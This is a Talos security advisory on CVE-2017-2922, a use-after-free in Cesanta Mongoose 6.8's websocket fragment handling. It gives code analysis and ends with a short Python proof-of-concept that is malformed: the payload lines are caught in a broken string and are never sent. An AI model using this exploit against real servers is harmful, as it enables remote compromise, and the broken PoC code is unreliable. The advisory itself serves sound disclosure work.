# Talos Vulnerability Report

### TALOS-2017-0429

## Cesanta Mongoose Websocket Protocol Fragmented Packet Code Execution Vulnerability

##### October 31, 2017

##### CVE Number

CVE-2017-2922

### Summary

An exploitable memory corruption vulnerability exists in the Websocket protocol implementation of Cesanta Mongoose 6.8. A specially crafted websocket packet can cause a buffer to be allocated while leaving stale pointers which leads to a use-after-free vulnerability which can be exploited to achieve remote code execution. An attacker needs to send a specially crafted websocket packet over network to trigger this vulnerability.

### Tested Versions

Cesanta Mongoose 6.8

### Product URLs

<https://cesanta.com/>

### CVSSv3 Score

9.8 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### CWE

CWE-416: Use After Free

### Details

Mongoose is a monolithic library implementing a number of networking protocols, including HTTP, MQTT, MDNS and others. It’s HTTP implementation includes upgrade support required for websocket applications. It is designed with embedded devices in mind and as such is used in many IoT devices and runs on virtually all platforms.

A websocket frame can be fragmented over multiple packets. Flags in the websocket header specify if the packet is fragmented and it’s order. When encountering a first frame fragment, a buffer reallocation causes several pointers to become invalid, but the code doesn’t invalidate or update them leading to potential use after free condition which can lead to further memory corruption.

In function `mg_deliver_websocket_data` responsible for parsing the websocket packet we observe the following code:

```
 if (reass) {                                                                         [1]
   /* On first fragmented frame, nullify size */
   if (mg_is_ws_first_fragment(wsm.flags)) {                                          [2]
     mbuf_resize(&nc->recv_mbuf, nc->recv_mbuf.size + sizeof(*sizep));                [3]
     p[0] &= ~0x0f; /* Next frames will be treated as continuation */                 [4]
     buf = p + 1 + sizeof(*sizep);                                                    [5]
     *sizep = 0; /* TODO(lsm): fix. this can stomp over frame data */                 [6]
   }

   /* Append this frame to the reassembled buffer */
   memmove(buf, wsm.data, e - wsm.data);                                              [7]

```

In the above code, if the packet is marked for reassembly (checked at [1]) and is first fragment (checked at [2]), receive buffer is resized at [3]. Function `mbuf_resize` actually calls `realloc` to resize the buffer. Calling `realloc` on a buffer to resize it doesn’t guarantee that the same memory would be used, a different heap chunk can be chosen and original data would be copied there. This effectively makes old pointers - pointing to original buffer - invalid. In the above code, stale pointers are reused at [4],[5],[6] and [7] to do memory reads, writes and a memory copy. Pointers `p`, `buf`,`e`,sizep `and` wsm.data `are all initialized based on original` nc->recv\_mbuf` buffer at the beginning of the function:

```
static int mg_deliver_websocket_data(struct mg_connection *nc) {
 /* Using unsigned char *, cause of integer arithmetic below */
 uint64_t i, data_len = 0, frame_len = 0, buf_len = nc->recv_mbuf.len, len,
           mask_len = 0, header_len = 0;
 unsigned char *p = (unsigned char *) nc->recv_mbuf.buf, *buf = p,
             *e = p + buf_len;

```

Calling `realloc` won’t invalidate a pointer always but, in this case steps can be taken make that probability higher, like multiple simultaneous network connections. Not invalidating and updating pointers after `realloc` leads to a use after free condition which can be abused to cause denial of service and ultimately remote code execution.

### Exploit Proof-of-Concept

import socket
import random
import struct
import sys
http_upgrade = ('GET /chat HTTP/1.1\r\n'
              'Host: server.example.com\r\n'
              'Upgrade: websocket\r\n'
              'Connection: Upgrade\r\n'
              'Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\n'
              'Sec-WebSocket-Protocol: chat, superchat\r\n'
              'Sec-WebSocket-Version: 13\r\n'
              'Origin: http://example.com\r\n\r\n')

payload = "\x01" # need to pass two checks:
"""
static int mg_is_ws_fragment(unsigned char flags) {
return (flags & 0x80) == 0 || (flags & 0x0f) == 0;
}

static int mg_is_ws_first_fragment(unsigned char flags) {
return (flags & 0x80) == 0 && (flags & 0x0f) != 0;
}
payload += chr(0x00 | 50 ) # packet doesn't have to be masked, so we can ommit it, size doesn't matter
payload += "A"*(60+ random.randint(0,20000)) # rest of the packet doesn't matter
"""
append random length of garbage so it's a bit easier to trigger the realloc when runing without ASAN ,
valgrind, or libdislocator, otherwise ~60 is enough
"""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1],int(sys.argv[2])))
s.send(http_upgrade)
print s.recv(1024)
